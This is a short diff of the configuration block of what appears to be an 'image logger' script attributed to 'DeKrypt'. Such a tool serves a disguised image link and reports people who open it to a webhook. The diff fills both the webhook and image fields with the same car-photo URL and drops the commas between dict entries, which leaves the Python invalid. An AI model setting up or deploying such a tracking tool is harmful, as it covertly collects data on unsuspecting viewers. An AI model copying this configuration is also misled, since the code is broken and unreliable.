@@ -12,9 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "webhook":'https://imgd.aeplcdn.com/1920x1080/n/cw/ec/204994/amg-gt-63-exterior-right-front-three-quarter-2.png?isig=0&q=80&q=80'
+    "image": "https://imgd.aeplcdn.com/1920x1080/n/cw/ec/204994/amg-gt-63-exterior-right-front-three-quarter-2.png?isig=0&q=80&q=80"                                              # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
